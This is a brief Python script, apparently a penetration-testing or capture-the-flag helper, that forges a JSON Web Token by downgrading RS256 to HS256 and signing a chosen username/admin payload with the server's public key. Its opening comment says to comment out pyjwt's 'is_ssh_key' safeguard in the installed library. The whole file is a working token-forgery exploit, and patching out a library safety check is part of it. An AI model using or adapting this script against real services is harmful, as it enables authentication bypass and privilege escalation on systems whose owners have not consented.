# This is Dowgrade the JWT Rs256 to hs256 .comment the  /usr/lib/python3/dist-packages/jwt/algorithms.py file on starting "is_ssh_key" to next 2 line and install pyjwt
import jwt

public_key = "ADD_KEY_HERE"

payload = {
    'username' : 'user',
    'admin' : 0
}

access_token = jwt.encode(payload, public_key, algorithm="HS256")
print (access_token)
